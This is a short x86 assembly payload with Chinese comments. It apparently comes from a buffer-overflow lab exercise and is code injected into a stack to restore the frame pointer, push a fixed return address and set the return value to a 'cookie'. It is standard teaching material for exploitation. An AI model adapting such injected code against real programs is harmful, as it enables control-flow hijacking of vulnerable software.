mov  %esp, %ebp
add  $0x28, %ebp
push $0x8048e3a        /* 返回地址 */
mov  $0x36bf12b0, %eax /* 设置返回值为cookie */
ret
